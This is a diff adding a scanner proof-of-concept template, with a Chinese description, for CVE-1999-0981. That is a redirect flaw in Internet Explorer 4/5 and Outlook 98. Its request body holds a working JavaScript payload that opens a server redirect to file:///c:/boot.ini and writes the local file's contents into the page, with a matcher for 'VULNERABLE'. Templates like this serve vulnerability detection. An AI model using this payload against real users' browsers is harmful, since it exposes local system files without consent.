@@ -1,0 +1,47 @@
+[info]
+author = "AVE"
+description = "检测 Microsoft Internet Explorer 4/5 及 Outlook 98 服务器端页面引用重定向漏洞。通过 window.open 创建窗口引用后利用服务器端重定向绕过同源策略读取本地文件。"
+id = "POC-AVE-1999-0791"
+name = "CVE-1999-0981 PoC"
+severity = "medium"
+tags = [
+    "cve-1999-0981",
+    "ie",
+    "redirect",
+    "local-file-access",
+]
+vuln_id = [
+    "CVE-1999-0981",
+    "AVE-1999-0791",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-1999-0981.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html>
+<body>
+<script>
+var w=window.open("/redirect?target=file:///c:/boot.ini");
+if(w.document && w.document.body) {
+  document.write("VULNERABLE:" + w.document.body.innerHTML);
+}
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["VULNERABLE"]
